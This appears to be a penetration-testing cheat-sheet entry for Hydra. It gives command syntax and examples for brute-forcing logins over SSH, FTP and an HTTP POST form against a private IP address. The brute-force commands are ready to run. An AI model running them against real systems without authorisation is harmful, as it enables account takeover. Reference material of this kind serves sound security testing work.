#### Hydra
A fast network logon cracker.

| Command                                                  | Description                                            |
| :------------------------------------------------------- | :----------------------------------------------------- |
| `hydra -l <user> -P <pass_list> <target> <service>`      | Brute-forces a single user's password using a list.    |
| `hydra -L <user_list> -p <pass> <target> <service>`      | Brute-forces a single password for multiple users.     |
| `hydra -L <user_list> -P <pass_list> <target> <service>` | Brute-forces a list of users with a list of passwords. |

**Examples:**
```bash
hydra -L users.txt -P pass.txt ssh://192.168.1.10
hydra -l admin -P pass.txt ftp://192.168.1.10
hydra -L users.txt -P pass.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"